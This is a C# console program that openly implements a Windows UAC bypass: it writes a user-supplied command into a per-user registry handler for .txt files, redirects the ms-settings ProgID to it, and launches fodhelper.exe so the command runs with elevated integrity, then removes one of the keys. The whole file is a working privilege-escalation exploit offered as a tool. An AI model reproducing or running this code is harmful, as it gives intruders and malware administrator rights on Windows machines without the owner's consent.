using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Uranium_Undone
{
    internal class Program
    {
        static void Main(string[] args)
        {
            UI.Ui.Banner();
            Console.WriteLine("Enter commmand you want to bypass UAC.");
            string input = Console.ReadLine();
            try
            {
                UNoSeeMe(input);
                Console.WriteLine("execution should have succeded.");
                Console.WriteLine("Pressing a key will close program and clean up");
                Console.ReadKey();
                LetItSeeAgain();

            }
            catch
            {
                Console.WriteLine("Cleaning up execution failed.");
                Console.ReadKey();
                LetItSeeAgain();
            }
            
            
        }

       public static void UNoSeeMe(string input)
        {
            RegistryKey testKey = Registry.CurrentUser.CreateSubKey(@"Software\Classes\.txt\Shell\Open\command", true);
            Console.WriteLine("[+] Created progID registry key");
            testKey.SetValue("", $"{input}");
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\CurVer", true);
            Console.WriteLine("[+] Assigning progID registry key");
            key.SetValue("", ".txt");
            Console.WriteLine("set key values");

            var p = new Process();
            p.StartInfo.FileName = "fodhelper.exe";
            p.Start();
            Console.WriteLine("UAC should be bypassed command should have ran in HIGH int if user can.");
        }

        public static void LetItSeeAgain()
        {
            RegistryKey key = Registry.CurrentUser;
            key.DeleteSubKey(@"Software\Classes\.txt\Shell\Open\command");
            Console.WriteLine("key deleted");
        }

    }
}
